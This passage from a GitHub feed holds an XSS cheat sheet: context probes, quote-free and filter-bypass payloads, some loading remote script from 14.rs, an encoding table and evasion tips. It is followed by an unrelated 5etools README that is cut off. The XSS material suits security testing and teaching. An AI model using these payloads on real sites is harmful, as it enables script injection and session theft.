section&lt;/p&gt; &#xA;&lt;p&gt;First of all, enter a non-malicious string like &lt;strong&gt;d3v&lt;/strong&gt; and look at the source code to get an idea about number and contexts of reflections. &lt;br&gt;Now for attribute context, check if double quotes (&#34;) are being filtered by entering &lt;code&gt;x&#34;d3v&lt;/code&gt;. If it gets altered to &lt;code&gt;x&amp;amp;quot;d3v&lt;/code&gt;, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (&#39;) by entering &lt;code&gt;x&#39;d3v&lt;/code&gt;, if it gets altered to &lt;code&gt;x&amp;amp;apos;&lt;/code&gt;, you are doomed. The only thing you can try is encoding.&lt;br&gt; If the quotes are not being filtered, you can simply try payloads from &lt;strong&gt;Awesome Context Breaking&lt;/strong&gt; section. &lt;br&gt;For javascript context, check which quotes are being used for example if they are doing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;variable = &#39;value&#39; or variable = &#34;value&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now lets say single quotes (&#39;) are in use, in that case enter &lt;code&gt;x&#39;d3v&lt;/code&gt;. If it gets altered to &lt;code&gt;x\&#39;d3v&lt;/code&gt;, try escaping the backslash () by adding a backslash to your probe i.e. &lt;code&gt;x\&#39;d3v&lt;/code&gt;. If it works use the following payload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;\&#39;-alert()//&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But if it gets altered to &lt;code&gt;x\\\&#39;d3v&lt;/code&gt;, the only thing you can try is closing the script tag itself by using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;/script&amp;gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For simple HTML context, the probe is &lt;code&gt;x&amp;lt;d3v&lt;/code&gt;. If it gets altered to &lt;code&gt;x&amp;amp;gt;d3v&lt;/code&gt;, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is &lt;code&gt;x&amp;lt;xxx&amp;gt;&lt;/code&gt;. If it gets stripped or altered in any way, it means the filter is looking for a pair of &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt;. It can simply bypassed using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=alert()//&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or this (it will not work in all cases)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=alert()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the your dummy tags lands in the source code as it is, go for any of these payloads&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&amp;lt;embed src=//14.rs&amp;gt;&#xA;&amp;lt;details open ontoggle=alert()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Bypassing&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; None of these payloads use single (&#39;) or double quotes (&#34;).&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without event handlers&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;object data=javascript:confirm()&amp;gt;&#xA;&amp;lt;a href=javascript:confirm()&amp;gt;click here&#xA;&amp;lt;script src=//14.rs&amp;gt;&amp;lt;/script&amp;gt;&#xA;&amp;lt;script&amp;gt;confirm()&amp;lt;/script&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without space&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg/onload=confirm()&amp;gt;&#xA;&amp;lt;iframe/src=javascript:alert(1)&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without slash (/)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=confirm()&amp;gt;&#xA;&amp;lt;img src=x onerror=confirm()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without equal sign (=)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;confirm()&amp;lt;/script&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without closing angular bracket (&amp;gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=confirm()//&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without alert, confirm, prompt&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script src=//14.rs&amp;gt;&amp;lt;/script&amp;gt;&#xA;&amp;lt;svg onload=co\u006efirm()&amp;gt;&#xA;&amp;lt;svg onload=z=co\u006efir\u006d,z()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Without a Valid HTML tag&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;x onclick=confirm()&amp;gt;click here&#xA;&amp;lt;x ondrag=aconfirm()&amp;gt;drag it&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bypass tag blacklisting&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;/ScRipT&amp;gt;&#xA;&amp;lt;/script&#xA;&amp;lt;/script/&amp;gt;&#xA;&amp;lt;/script x&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Encoding&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;HTML&lt;/th&gt; &#xA;   &lt;th&gt;Char&lt;/th&gt; &#xA;   &lt;th&gt;Numeric&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;   &lt;th&gt;Hex&lt;/th&gt; &#xA;   &lt;th&gt;CSS (ISO)&lt;/th&gt; &#xA;   &lt;th&gt;JS (Octal)&lt;/th&gt; &#xA;   &lt;th&gt;URL&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;quot;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&#34;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#34;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;quotation mark&lt;/td&gt; &#xA;   &lt;td&gt;u+0022&lt;/td&gt; &#xA;   &lt;td&gt;\0022&lt;/td&gt; &#xA;   &lt;td&gt;\42&lt;/td&gt; &#xA;   &lt;td&gt;%22&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;num;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;#&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#35;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;number sign&lt;/td&gt; &#xA;   &lt;td&gt;u+0023&lt;/td&gt; &#xA;   &lt;td&gt;\0023&lt;/td&gt; &#xA;   &lt;td&gt;\43&lt;/td&gt; &#xA;   &lt;td&gt;%23&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;dollar;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;$&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#36;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;dollar sign&lt;/td&gt; &#xA;   &lt;td&gt;u+0024&lt;/td&gt; &#xA;   &lt;td&gt;\0024&lt;/td&gt; &#xA;   &lt;td&gt;\44&lt;/td&gt; &#xA;   &lt;td&gt;%24&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;percnt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;%&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#37;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;percent sign&lt;/td&gt; &#xA;   &lt;td&gt;u+0025&lt;/td&gt; &#xA;   &lt;td&gt;\0025&lt;/td&gt; &#xA;   &lt;td&gt;\45&lt;/td&gt; &#xA;   &lt;td&gt;%25&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;amp;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&amp;amp;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#38;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;ampersand&lt;/td&gt; &#xA;   &lt;td&gt;u+0026&lt;/td&gt; &#xA;   &lt;td&gt;\0026&lt;/td&gt; &#xA;   &lt;td&gt;\46&lt;/td&gt; &#xA;   &lt;td&gt;%26&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;apos;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&#39;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#39;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;apostrophe&lt;/td&gt; &#xA;   &lt;td&gt;u+0027&lt;/td&gt; &#xA;   &lt;td&gt;\0027&lt;/td&gt; &#xA;   &lt;td&gt;\47&lt;/td&gt; &#xA;   &lt;td&gt;%27&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;lpar;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#40;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;left parenthesis&lt;/td&gt; &#xA;   &lt;td&gt;u+0028&lt;/td&gt; &#xA;   &lt;td&gt;\0028&lt;/td&gt; &#xA;   &lt;td&gt;\50&lt;/td&gt; &#xA;   &lt;td&gt;%28&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;rpar;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#41;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;right parenthesis&lt;/td&gt; &#xA;   &lt;td&gt;u+0029&lt;/td&gt; &#xA;   &lt;td&gt;\0029&lt;/td&gt; &#xA;   &lt;td&gt;\51&lt;/td&gt; &#xA;   &lt;td&gt;%29&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;ast;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;*&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#42;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;asterisk&lt;/td&gt; &#xA;   &lt;td&gt;u+002A&lt;/td&gt; &#xA;   &lt;td&gt;\002a&lt;/td&gt; &#xA;   &lt;td&gt;\52&lt;/td&gt; &#xA;   &lt;td&gt;%2A&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;plus;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;+&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#43;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;plus sign&lt;/td&gt; &#xA;   &lt;td&gt;u+002B&lt;/td&gt; &#xA;   &lt;td&gt;\002b&lt;/td&gt; &#xA;   &lt;td&gt;\53&lt;/td&gt; &#xA;   &lt;td&gt;%2B&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;comma;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;,&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#44;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;comma&lt;/td&gt; &#xA;   &lt;td&gt;u+002C&lt;/td&gt; &#xA;   &lt;td&gt;\002c&lt;/td&gt; &#xA;   &lt;td&gt;\54&lt;/td&gt; &#xA;   &lt;td&gt;%2C&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;minus;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#45;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;hyphen-minus&lt;/td&gt; &#xA;   &lt;td&gt;u+002D&lt;/td&gt; &#xA;   &lt;td&gt;\002d&lt;/td&gt; &#xA;   &lt;td&gt;\55&lt;/td&gt; &#xA;   &lt;td&gt;%2D&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;period;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;.&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#46;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;full stop; period&lt;/td&gt; &#xA;   &lt;td&gt;u+002E&lt;/td&gt; &#xA;   &lt;td&gt;\002e&lt;/td&gt; &#xA;   &lt;td&gt;\56&lt;/td&gt; &#xA;   &lt;td&gt;%2E&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;sol;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;/&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#47;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;solidus; slash&lt;/td&gt; &#xA;   &lt;td&gt;u+002F&lt;/td&gt; &#xA;   &lt;td&gt;\002f&lt;/td&gt; &#xA;   &lt;td&gt;\57&lt;/td&gt; &#xA;   &lt;td&gt;%2F&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;colon;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;:&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#58;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;colon&lt;/td&gt; &#xA;   &lt;td&gt;u+003A&lt;/td&gt; &#xA;   &lt;td&gt;\003a&lt;/td&gt; &#xA;   &lt;td&gt;\72&lt;/td&gt; &#xA;   &lt;td&gt;%3A&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;semi;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#59;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;semicolon&lt;/td&gt; &#xA;   &lt;td&gt;u+003B&lt;/td&gt; &#xA;   &lt;td&gt;\003b&lt;/td&gt; &#xA;   &lt;td&gt;\73&lt;/td&gt; &#xA;   &lt;td&gt;%3B&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;lt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&amp;lt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#60;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;less-than&lt;/td&gt; &#xA;   &lt;td&gt;u+003C&lt;/td&gt; &#xA;   &lt;td&gt;\003c&lt;/td&gt; &#xA;   &lt;td&gt;\74&lt;/td&gt; &#xA;   &lt;td&gt;%3C&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;equals;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;=&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#61;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;equals&lt;/td&gt; &#xA;   &lt;td&gt;u+003D&lt;/td&gt; &#xA;   &lt;td&gt;\003d&lt;/td&gt; &#xA;   &lt;td&gt;\75&lt;/td&gt; &#xA;   &lt;td&gt;%3D&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&amp;gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#62;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;greater-than sign&lt;/td&gt; &#xA;   &lt;td&gt;u+003E&lt;/td&gt; &#xA;   &lt;td&gt;\003e&lt;/td&gt; &#xA;   &lt;td&gt;\76&lt;/td&gt; &#xA;   &lt;td&gt;%3E&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;quest;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;?&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#63;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;question mark&lt;/td&gt; &#xA;   &lt;td&gt;u+003F&lt;/td&gt; &#xA;   &lt;td&gt;\003f&lt;/td&gt; &#xA;   &lt;td&gt;\77&lt;/td&gt; &#xA;   &lt;td&gt;%3F&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;commat;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;@&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#64;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;at sign; commercial at&lt;/td&gt; &#xA;   &lt;td&gt;u+0040&lt;/td&gt; &#xA;   &lt;td&gt;\0040&lt;/td&gt; &#xA;   &lt;td&gt;\100&lt;/td&gt; &#xA;   &lt;td&gt;%40&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;lsqb;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;[&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#91;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;left square bracket&lt;/td&gt; &#xA;   &lt;td&gt;u+005B&lt;/td&gt; &#xA;   &lt;td&gt;\005b&lt;/td&gt; &#xA;   &lt;td&gt;\133&lt;/td&gt; &#xA;   &lt;td&gt;%5B&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;bsol;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;\&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#92;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;backslash&lt;/td&gt; &#xA;   &lt;td&gt;u+005C&lt;/td&gt; &#xA;   &lt;td&gt;\005c&lt;/td&gt; &#xA;   &lt;td&gt;\134&lt;/td&gt; &#xA;   &lt;td&gt;%5C&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;rsqb;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;]&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#93;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;right square bracket&lt;/td&gt; &#xA;   &lt;td&gt;u+005D&lt;/td&gt; &#xA;   &lt;td&gt;\005d&lt;/td&gt; &#xA;   &lt;td&gt;\135&lt;/td&gt; &#xA;   &lt;td&gt;%5D&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;Hat;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;^&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#94;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;circumflex accent&lt;/td&gt; &#xA;   &lt;td&gt;u+005E&lt;/td&gt; &#xA;   &lt;td&gt;\005e&lt;/td&gt; &#xA;   &lt;td&gt;\136&lt;/td&gt; &#xA;   &lt;td&gt;%5E&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;lowbar;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;_&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#95;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;low line&lt;/td&gt; &#xA;   &lt;td&gt;u+005F&lt;/td&gt; &#xA;   &lt;td&gt;\005f&lt;/td&gt; &#xA;   &lt;td&gt;\137&lt;/td&gt; &#xA;   &lt;td&gt;%5F&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;grave;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;`&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#96;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;grave accent&lt;/td&gt; &#xA;   &lt;td&gt;u+0060&lt;/td&gt; &#xA;   &lt;td&gt;\0060&lt;/td&gt; &#xA;   &lt;td&gt;\u0060&lt;/td&gt; &#xA;   &lt;td&gt;%60&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;lcub;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;{&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#123;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;left curly bracket&lt;/td&gt; &#xA;   &lt;td&gt;u+007b&lt;/td&gt; &#xA;   &lt;td&gt;\007b&lt;/td&gt; &#xA;   &lt;td&gt;\173&lt;/td&gt; &#xA;   &lt;td&gt;%7b&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;verbar;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;|&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#124;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;vertical bar&lt;/td&gt; &#xA;   &lt;td&gt;u+007c&lt;/td&gt; &#xA;   &lt;td&gt;\007c&lt;/td&gt; &#xA;   &lt;td&gt;\174&lt;/td&gt; &#xA;   &lt;td&gt;%7c&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;rcub;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;}&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;&amp;amp;#125;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;right curly bracket&lt;/td&gt; &#xA;   &lt;td&gt;u+007d&lt;/td&gt; &#xA;   &lt;td&gt;\007d&lt;/td&gt; &#xA;   &lt;td&gt;\175&lt;/td&gt; &#xA;   &lt;td&gt;%7d&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Awesome Tips &amp;amp; Tricks&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;http(s)://&lt;/code&gt; can be shortened to &lt;code&gt;//&lt;/code&gt; or &lt;code&gt;/\\&lt;/code&gt; or &lt;code&gt;\\&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;document.cookie&lt;/code&gt; can be shortened to &lt;code&gt;cookie&lt;/code&gt;. It applies to other DOM objects as well.&lt;/li&gt; &#xA; &lt;li&gt;alert and other pop-up functions don&#39;t need a value, so stop doing &lt;code&gt;alert(&#39;XSS&#39;)&lt;/code&gt; and start doing &lt;code&gt;alert()&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;You can use &lt;code&gt;//&lt;/code&gt; to close a tag instead of &lt;code&gt;&amp;gt;&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;I have found that &lt;code&gt;confirm&lt;/code&gt; is the least detected pop-up function so stop using &lt;code&gt;alert&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Quotes around attribute value aren&#39;t necessary as long as it doesn&#39;t contain spaces. You can use &lt;code&gt;&amp;lt;script src=//14.rs&amp;gt;&lt;/code&gt; instead of &lt;code&gt;&amp;lt;script src=&#34;//14.rs&#34;&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The shortest HTML context XSS payload is &lt;code&gt;&amp;lt;script src=//14.rs&amp;gt;&lt;/code&gt; (19 chars)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Awesome Credits&lt;/h3&gt; &#xA;&lt;p&gt;All the payloads are crafted by me unless specified.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>5etools-mirror-1/5etools-mirror-1.github.io</title>
    <updated>2023-01-15T01:37:53Z</updated>
    <id>tag:github.com,2023-01-15:/5etools-mirror-1/5etools-mirror-1.github.io</id>
    <link href="https://github.com/5etools-mirror-1/5etools-mirror-1.github.io" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A mirror.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;5e.tools&lt;/h2&gt; &#xA;&lt;p&gt;Visit the &lt;a href=&#34;https://5e.tools/index.html&#34;&gt;main site&lt;/a&gt; or go to the unofficial GitHub &lt;a href=&#34;https://raw.githubusercontent.com/5etools-mirror-1/5etools-mirror-1.github.io/master/index.html&#34;&gt;mirror&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/5etools&#34;&gt;Join the 5etools Discord here!&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Help and Support&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://wiki.tercept.net/&#34;&gt;our wiki&lt;/a&gt; for FAQs, installation guides, supported integrations, and more.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Developer Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Data Sources and Versioning&lt;/h3&gt; &#xA;&lt;p&gt;Only &#34;official&#34; (that is, published by WotC) data is to be included in the site. Anything else should be added to the homebrew repository. Some exceptions to this rule are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;All Adventurers League (AL) -specific content is to be kept in the homebrew repository. While much of this content broadly falls under the &#34;published by WotC&#34; umbrella, a good deal of it doesn&#39;t. For the sake of consistency/cleanliness, all AL content is to be considered homebrew.&lt;/li&gt; &#xA; &lt;li&gt;Anything published in the Dragon+ magazine.&lt;/li&gt; &#xA; &lt;li&gt;Anything veto&#39;d by the maintainers of this repository.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Prioritise RAW above all else. Aim to provide a 1:1 copy of the original data. Obvious typos (for instance, mathematical errors in creature stat blocks) may be corrected at the discretion of the maintainer(s).&lt;/p&gt; &#xA;&lt;p&gt;Aim to use the latest version of any published material. Older versions which are sufficiently different (and relevant to community interests) can be moved to the homebrew repository.&lt;/p&gt; &#xA;&lt;p&gt;The primary source for an entity should be that under which it was first released. Exceptions to this rule include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The entity was originally released in a &#34;partial&#34; or &#34;pre-release&#34; form. For example, races from WGE were later re-released in ERLW.&lt;/li&gt; &#xA; &lt;li&gt;The entity was originally released in a published adventure, but 